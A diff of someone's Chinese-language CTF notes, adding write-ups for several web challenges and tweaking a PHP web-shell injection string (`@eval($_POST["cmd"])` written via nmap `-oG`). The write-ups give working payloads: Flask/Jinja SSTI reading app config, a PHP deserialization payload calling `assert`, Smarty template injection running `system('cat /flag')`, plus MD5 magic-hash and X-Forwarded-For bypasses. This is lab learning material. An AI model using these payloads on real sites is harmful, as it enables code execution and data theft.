@@ -3032,7 +3032,7 @@ if(!isset($_GET['host'])) {
 
 ```bash
 <?php
-$_GET['host'] = '<?php @eval($_POST["cmd"]);?> -oG yjh.php';
+$_GET['host'] = ' <?php @eval($_POST["cmd"]);?> -oG yjh.php ';
 
 if(!isset($_GET['host'])) {
     highlight_file(__FILE__);
@@ -3761,9 +3761,174 @@ $a = new Show($b);
 echo urlencode(serialize($a));
 ```
 
+## [MRCTF2020]PYWebsite
+
+这题总体来说还是非常简单，10分钟左右就做出来了，首先看源码，注意到一个JavaScript的判断，只要输入的值在经过md5计算后是等于：`0cd4da0223c0b280829dc3ea458d655c`就可以了
+
+一开始的想法是JavaScript的md5绕过，然后百度了一下发现没有相关的知识点。马上就想到可以通过尝试修改响应报文来绕过：
+
+![image-20231129161804165](CTF.assets/image-20231129161804165.png)
+
+使用Burp Suite拦截请求报文，然后修改md5值
+
+<img src="CTF.assets/image-20231129162016085.png" alt="image-20231129162016085" style="zoom:67%;" />
+
+`md5('QNKCDZO')=0e830400451993494058024219903391`
+
+![image-20231129162106037](CTF.assets/image-20231129162106037.png)
+
+查看源码可以发现md5值已经成功被修改
+
+![image-20231129162217783](CTF.assets/image-20231129162217783.png)
+
+输入验证码`QNKCDZO`即可成功绕过，返回`flag.php`，一开始我将首页和`flag.php`的源码都检查了一遍都没有发现`flag`，然后尝试使用：`X-Forwarded-For`成功绕过
+
+![image-20231129162258154](CTF.assets/image-20231129162258154.png)
+
+![image-20231129162508941](CTF.assets/image-20231129162508941.png)
+
+![image-20231129162523758](CTF.assets/image-20231129162523758.png)
+
+## [ASIS 2019]Unicorn shop
+
+### Unionde等价性的漏洞
+
+在Unicode编码中，同一意义的字符会有多种表现形式，如5和⑤，那么对这些不同形式但意义相同的union字符做比较，就有可能说他们是等价的
+
+### 复现
+
+尝试购买ID为：`1,2,3`的商品都不被允许
+
+![image-20231129165924359](CTF.assets/image-20231129165924359.png)
+
+![image-20231129165957555](CTF.assets/image-20231129165957555.png)
+
+只有在购买ID为4的商品时才会返回`You don't have enough money!`，但是在价格项这里又只能输入一个字符
+
+![image-20231129170104933](CTF.assets/image-20231129170104933.png)
+
+所以这里要利用Unicode等价漏洞，`https://www.compart.com/en/unicode/`搜索比`1337`大的Unicode编码的符号即可，这里搜索`three thousand`
+
+![image-20231129170258781](CTF.assets/image-20231129170258781.png)
+
+![image-20231129170311308](CTF.assets/image-20231129170311308.png)
+
+最后拿到`flag`：`flag{7e94bf37-e3f0-48df-9c81-a53df35b5fe1}`
+
+![image-20231129170340496](CTF.assets/image-20231129170340496.png)
+
+## [WesternCTF2018]shrine
+
+进来之后得到源码
+
+```py
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+# 这里可以确定 flag 在配置文件中
+app.config['FLAG'] = os.environ.pop('FLAG')
+
+
+@app.route('/')
+def index():
+    return open(__file__).read()
+
+
+@app.route('/shrine/<path:shrine>')
+def shrine(shrine):
+    def safe_jinja(s):
+        s = s.replace('(', '').replace(')', '')
+        blacklist = ['config', 'self']
+        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
+
+    return flask.render_template_string(safe_jinja(shrine))
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+```
+
+通过分析源码就可以知道我们要拿到FLASK的配置文件，但是` blacklist = ['config', 'self']`又做了过滤。这里翻了下葵花宝典找到两条payload
+
+```
+{{url_for.__globals__['current_app'].config}}
+{{get_flashed_messages.__globals__['current_app'].config}}
+```
+
+直接输入就得到flag：`flag{5c830575-f722-43c4-b135-91fd2615e0bd}`
+
+```
+payload：/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
+```
+
+## [NPUCTF2020]ReadlezPHP
+
+进来右键看不到源码，然后将`view-source`复制到URL前面成功看到源码并看到一个链接：`time.php?source`，进来可以看到是一个非常简单的PHP反序列化
+
+```php
+<?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a;
+    public $b;
+    public function __construct(){
+        $this->a = "Y-m-d h:i:s";
+        $this->b = "date";
+    }
+    public function __destruct(){
+        $a = $this->a;
+        $b = $this->b;
+        echo $b($a);
+    }
+}
+$c = new HelloPhp;
+
+if(isset($_GET['source']))
+{
+    highlight_file(__FILE__);
+    die(0);
+}
+
+@$ppp = unserialize($_GET["data"]);
+```
+
+很明显，在`HelloPhp`类种，`$b`是函数，`$a`是选项！
+
+以此构造payload即可，但是这里过滤了很多函数，只剩下`assert`可用，以后再尝试了`system`和`eval`之后还得记住尝试`assert`，然后flag在`phpinfo`里
+
+```
+payload：
+data=O:8:"HelloPhp":2:{s:1:"a";s:10:"phpinfo();";s:1:"b";s:6:"assert";}
+```
+
+## [CISCN2019 华东南赛区]Web11
+
+进来第一眼我以为是通过构造一个特殊的请求报文来请求页面返回flag，结果不行。后面看了一下才发现是smarty模板注入
+
+![image-20231129214738121](CTF.assets/image-20231129214738121.png)
 
 
 
+![image-20231129214845915](CTF.assets/image-20231129214845915.png)
+
+以这张图为基准，尝试payload：`a{*comment*}b`查看返回内容
+
+![img](CTF.assets/d4491195d8a1a67e38494b035030d89157bccd25.png@1256w_750h_!web-article-pic.avif)
+
+证明确实是smarty模板注入漏洞，直接百度一下就能得到相关的payload
+
+![image-20231129214957579](CTF.assets/image-20231129214957579.png)
+
+```
+{if phpinfo()}{/if}
+{if readfile ('/flag')}{/if}
+{if show_source('/flag')}{/if}
+{if system('cat /flag')}{/if}		# 使用这个payload即可
+```
 
 # Misc
 
